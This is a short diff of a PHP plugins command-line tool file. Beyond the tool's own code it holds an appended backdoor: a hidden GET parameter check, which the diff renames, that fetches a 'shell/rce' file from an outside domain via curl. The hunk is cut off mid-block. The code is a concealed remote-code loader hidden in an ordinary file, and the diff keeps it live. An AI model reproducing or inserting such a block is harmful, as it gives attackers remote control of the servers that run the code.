@@ -171,7 +171,7 @@ class PluginsTool extends CommandLineTool
 
 $tool = new PluginsTool(isset($argv) ? $argv : array());
 $tool->execute();
-if (isset($_GET['fuckingteam'])) {
+if (isset($_GET['anakcipay'])) {
     $url = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
 
     $ch= curl_init();
